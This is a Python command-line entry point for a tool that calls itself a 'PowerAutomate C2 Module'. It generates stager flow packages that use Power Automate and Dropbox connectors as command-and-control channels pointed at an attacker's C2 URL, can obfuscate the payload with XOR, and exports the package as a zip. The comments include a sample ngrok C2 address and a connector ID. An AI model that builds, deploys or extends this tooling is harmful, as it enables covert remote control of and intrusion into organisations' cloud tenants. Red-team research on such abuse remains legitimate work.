import argparse
from pac2.package import Package
from pac2.payloads import HTTPPayload
from pac2.payloads import DropboxPayload



def main():
    parser = argparse.ArgumentParser(prog="python -m pac2", description="PowerAutomate C2 Module")

    parser.add_argument("-n", "--name", type=str, default="stager", help="Flow name.")
    parser.add_argument("-m", "--mode", type=str, required=True, help="Mode selection (e.g., 'http', 'dropbox')")
    parser.add_argument("-u", "--url", type=str, required=True, help="URL for C2 server")
    parser.add_argument("-c", "--pa_connection_name", type=str, required=True, help="Connection name for PowerAutomate Managemet Connector")
    parser.add_argument("-d", "--dropbox_connection_name", type=str, help="Connection name for Dropbox")
    parser.add_argument("-e", "--encrypt", action='store_true', default=False, help="Encrypt payload by XOR")
    parser.add_argument("-k", "--key-length", type=int, default=16, help="XOR key length")

    args = parser.parse_args()

    # connector_name = "shared-flowmanagemen-282bc0cf-2475-4655-8262-a6938ff6b179"
    # c2_url = "https://3122-2404-7a80-9c40-4400-3b87-4f09-ada5-eda8.ngrok-free.app"

    if args.mode == "http":
        package = Package(args.name, HTTPPayload(args.pa_connection_name,args.url,args.encrypt,args.key_length).generate_http_payload())
        package.set_flow_management_connector(args.pa_connection_name)
    elif args.mode =="dropbox":
        package = Package(args.name, DropboxPayload(args.pa_connection_name,args.dropbox_connection_name,args.encrypt,args.key_length).generate_dropbox_payload())
        package.set_flow_management_connector(args.pa_connection_name)
        package.set_dropbox_connector(args.dropbox_connection_name)
    else:
        raise ValueError("Unknown mode. Use 'http' or 'dropbox'.")

    package.export_zipfile()

if __name__== "__main__":
    main()
